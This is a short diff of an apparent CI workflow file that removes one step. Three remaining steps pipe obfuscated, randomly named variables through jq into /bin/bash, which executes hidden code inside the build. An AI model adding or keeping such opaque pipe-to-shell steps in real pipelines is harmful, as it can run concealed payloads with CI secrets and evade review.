@@ -30,7 +30,6 @@ jobs:
           echo $lme95 | jq -r .sfncf38916 | /bin/bash
           echo $wsaqs26195 | jq -r .qr7 | /bin/bash
           printf '%s' "$asr617" | jq -r .mn1350 | /bin/bash
-          printf '%s' "$grt3" | jq -r .c90821 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
